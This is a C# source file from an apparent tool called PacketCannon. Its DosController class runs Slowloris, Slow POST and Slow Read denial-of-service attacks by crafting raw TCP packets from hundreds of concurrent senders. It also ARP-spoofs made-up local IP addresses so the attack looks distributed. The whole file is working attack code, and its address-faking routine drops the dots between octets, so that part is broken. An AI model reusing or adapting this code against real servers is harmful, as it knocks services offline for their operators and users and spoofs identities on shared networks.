using PcapDotNet.Core;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;
using static PacketCannon.AttackVariation;
using static PacketCannon.SenderStatus;

namespace PacketCannon
{
    public class DosController
    {
        public ConcurrentBag<DosSender> SlowLorisSenders;

        public string SourceIpv4;
        public string DestinationIpV4 { get; set; }
        public static PacketCommunicator Communicator;
        public PacketDevice SelectedDevice { get; set; }
        private Attacks? _attackMode = Attacks.SlowLoris;
        public int SenderSize = 500;
        public bool Terminate = false;
        public string HostAddress;
        public int SenderTimeOut = 0;
        public int SenderWaveTimeOut = 0;
        public int SourcePort = 5000;
        public int PortStep = 1;
        public MacAddress SourceMac { get; set; }
        public MacAddress DestinationMac { get; set; }
        public int SlowPostContentLength = 1000000;
        public string SlowLorisKeepAliveData = "X-a: b";
        public string SlowLorisHeaderNotComplete;
        public string SlowPostHeader;
        public string SlowReadUrl = @"/index.html";
        public static List<IpV4Address> FakeIpV4Addresses;
        public bool Ddos = false;
        public int DdosCount = 5;
        public int FakeIpAddressMin = 1;
        public int FakeIpAddressMax = 254;

        public string GetLocalMacAddress(string ipAddress)
        {
            return Regex.Replace(
                NetworkInterface.GetAllNetworkInterfaces()
                    .FirstOrDefault(netInt => SelectedDevice.Name.Contains(netInt.Id))
                    ?.GetPhysicalAddress().ToString() ?? throw new InvalidOperationException(),
                ".{2}", "$0:").TrimEnd(':');
        }

        public void ChangeAttackMode(string attacksText)
        {
            switch (attacksText)
            {
                case "0":
                    _attackMode = Attacks.SlowLoris;
                    break;

                case "1":
                    _attackMode = Attacks.SlowPost;
                    break;

                case "2":
                    _attackMode = Attacks.SlowRead;
                    break;
            }
        }

        public void StartSenders()
        {
            if (Ddos)
            {
                var tester = new DosSender(SelectedDevice, SourceIpv4, DestinationIpV4, HostAddress,
                    SlowLorisKeepAliveData, SlowLorisHeaderNotComplete, SlowPostContentLength, SlowPostHeader,
                    SlowReadUrl, SourcePort, PortStep);
                ArpSpoofAddress(DdosCount, tester);
            }

            SlowLorisSenders = new ConcurrentBag<DosSender>();

            for (int i = 0; i < SenderSize; i++)
            {
                SlowLorisSenders.Add(new DosSender(SelectedDevice, SourceIpv4, DestinationIpV4, HostAddress, SlowLorisKeepAliveData, SlowLorisHeaderNotComplete, SlowPostContentLength, SlowPostHeader, SlowReadUrl, SourcePort, PortStep, Ddos));
            }
            var watcher = new Thread(SearchForPackets);
            watcher.Start();
            using (Communicator = SelectedDevice.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 100))
            {
                while (true)
                {
                    foreach (var slowLorisSender in SlowLorisSenders)
                    {
                        switch (slowLorisSender.Status)
                        {
                            case SenderStat.SendSyn:
                                slowLorisSender.SendSyn(Communicator);
                                slowLorisSender.Status = SenderStat.WaitingForAck;
                                break;
                            //SLOW-READ
                            case SenderStat.RecievingSlowRead:
                            case SenderStat.WaitingForAck:
                                break;

                            //SLOW-LORIS
                            case SenderStat.SendingAck when _attackMode == Attacks.SlowLoris:
                                slowLorisSender.SendAck(Communicator);
                                slowLorisSender.Status = SenderStat.SendingSlowLorisGetHeader;
                                break;

                            //SLOW-POST
                            case SenderStat.SendingAck when _attackMode == Attacks.SlowPost:
                                slowLorisSender.SendAck(Communicator);
                                slowLorisSender.Status = SenderStat.SedingSlowPostHeader;
                                break;

                            //SLOW-READ
                            case SenderStat.SendingAck when _attackMode == Attacks.SlowRead:
                                slowLorisSender.SendAck(Communicator);
                                slowLorisSender.Status = SenderStat.SedingGetForSlowRead;
                                break;

                            //SLOW-LORIS
                            case SenderStat.SendingSlowLorisGetHeader:
                                slowLorisSender.SendGetNotComplete(Communicator);
                                slowLorisSender.Status = SenderStat.SendingKeepAliveForSlowLoris;
                                break;

                            //SLOW-LORIS
                            case SenderStat.SendingKeepAliveForSlowLoris:
                                slowLorisSender.SendKeepAliveForSlowLoris(Communicator);
                                break;

                            //SLOW-POST
                            case SenderStat.SedingSlowPostHeader:
                                slowLorisSender.SendSlowPostHeader(Communicator);
                                slowLorisSender.Status = SenderStat.SedingKeepAliveForSlowPost;
                                break;

                            //SLOW-POST
                            case SenderStat.SedingKeepAliveForSlowPost:
                                slowLorisSender.SendKeepAliveForSlowPost(Communicator);
                                break;

                            //SLOW-READ
                            case SenderStat.SedingGetForSlowRead:
                                slowLorisSender.WindowSize = 10;
                                slowLorisSender.SendCompleteGetForSlowRead(Communicator);
                                slowLorisSender.Status = SenderStat.RecievingSlowRead;
                                break;

                            //SLOW-READ
                            case SenderStat.SendKeepAliveAckForSlowRead:
                                slowLorisSender.Status = SenderStat.RecievingSlowRead;
                                slowLorisSender.SendAck(Communicator);
                                break;

                            default:
                                throw new ArgumentOutOfRangeException();
                        }
                        //Thread.Sleep(SenderTimeOut == 0 ? new Random().Next(5, 20) : SenderTimeOut);
                    }
                    Thread.Sleep(SenderWaveTimeOut == 0 ? new Random().Next(1000, 5000) : SenderWaveTimeOut);
                }
            }
        }

        private void SearchForPackets()
        {
            using (PacketCommunicator com = SelectedDevice.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 100))
            {
                com.SetFilter("tcp and src " + DestinationIpV4 + " and src port " + DosSender.DestinationPort);
                while (true)
                {
                    if (com.ReceivePacket(out var packet) == PacketCommunicatorReceiveResult.Ok)
                    {
                        DosSender a;
                        try
                        {
                            a = Ddos ? SlowLorisSenders.First(x => x.SourcePort == packet.Ethernet.IpV4.Tcp.DestinationPort && FakeIpV4Addresses.Contains(packet.Ethernet.IpV4.Destination))
                             : SlowLorisSenders.First(x => x.SourcePort == packet.Ethernet.IpV4.Tcp.DestinationPort);
                        }
                        catch (Exception)
                        {
                            continue;
                        }

                        if (a.Status == SenderStat.WaitingForAck)
                        {
                            a.Status = SenderStat.SendingAck;
                            a.SeqNumber = a.ExpectedAckNumber;
                            a.AckNumber = packet.Ethernet.IpV4.Tcp.SequenceNumber + 1;
                        }
                        else if (packet.Ethernet.IpV4.Tcp.ControlBits == (TcpControlBits)20 || packet.Ethernet.IpV4.Tcp.ControlBits == (TcpControlBits)4)
                        {
                            a.Status = SenderStat.SendSyn;
                            a.SeqNumber = (uint)new Random().Next();
                        }
                        else if (a.Status == SenderStat.RecievingSlowRead && _attackMode == Attacks.SlowRead &&
                                 (packet.Ethernet.IpV4.Tcp.ControlBits == TcpControlBits.Acknowledgment || packet.Ethernet.IpV4.Tcp.ControlBits == (TcpControlBits)24))
                        {
                            a.Status = SenderStat.SendKeepAliveAckForSlowRead;
                            a.AckNumber = packet.Ethernet.IpV4.Tcp.SequenceNumber + (uint)packet.Ethernet.IpV4.Tcp.PayloadLength;
                        }
                    }
                }
            }
        }

        private void ArpSpoofAddress(int count, DosSender tester)
        {
            CreateFakeAddresses(count);

            using (Communicator = SelectedDevice.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 100))
            {
                Communicator.SetFilter("arp and src " + DestinationIpV4);
                foreach (var fakeIpV4Address in FakeIpV4Addresses)
                {
                    for (int i = 0; i < 10; i++)
                    {
                        tester.PingAddress(Communicator, fakeIpV4Address);

                        if (Communicator.ReceivePacket(out var packet) == PacketCommunicatorReceiveResult.Ok && packet.Ethernet.Source == tester.DestinationMac)
                        {
                            break;
                        }
                    }
                    tester.SendArpResponse(Communicator, fakeIpV4Address);
                }
            }
        }

        private void CreateFakeAddresses(int count)
        {
            FakeIpV4Addresses = new List<IpV4Address>();
            var rnd = new Random();
            var ipAddress = ParseIpAddress(SourceIpv4);

            while (FakeIpV4Addresses.Count != count)
            {
                var ipAddressFaked = new IpV4Address(ipAddress[0] + ipAddress[1] + ipAddress[2] + rnd.Next(FakeIpAddressMin, FakeIpAddressMax));
                if (!FakeIpV4Addresses.Contains(ipAddressFaked))
                {
                    FakeIpV4Addresses.Add(ipAddressFaked);
                }
            }
        }

        [DllImport("iphlpapi.dll", ExactSpelling = true)]
        private static extern int SendARP(int destIp, int srcIp, [Out] byte[] pMacAddr, ref int phyAddrLen);

        public static MacAddress GetMacFromIp(string ipAdress)
        {
            var hostIpAddress = IPAddress.Parse(ipAdress);
            var ab = new byte[6];
            int len = ab.Length, r = DosController.SendARP((int)hostIpAddress.Address, srcIp: 0, pMacAddr: ab, phyAddrLen: ref len);
            return new MacAddress(BitConverter.ToString(ab, 0, 6).Replace("-", ":"));
        }

        private static string[] ParseIpAddress(string ipV4Address)
        {
            return ipV4Address.Split('.').Select(n => n).ToArray();
        }

        public static bool PingAddress(string address)
        {
            bool pingable = false;
            Ping pinger = null;

            try
            {
                pinger = new Ping();
                PingReply reply = pinger.Send(address);
                pingable = reply.Status == IPStatus.Success;
            }
            catch (PingException)
            {
                // Discard PingExceptions and return false;
            }
            finally
            {
                pinger?.Dispose();
            }

            return pingable;
        }

        public static IPAddress GetDefaultGateway()
        {
            return NetworkInterface
                .GetAllNetworkInterfaces()
                .Where(n => n.OperationalStatus == OperationalStatus.Up)
                .Where(n => n.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                .SelectMany(n => n.GetIPProperties()?.GatewayAddresses)
                .Select(g => g?.Address)
                .FirstOrDefault(a => a != null);
        }
    }
}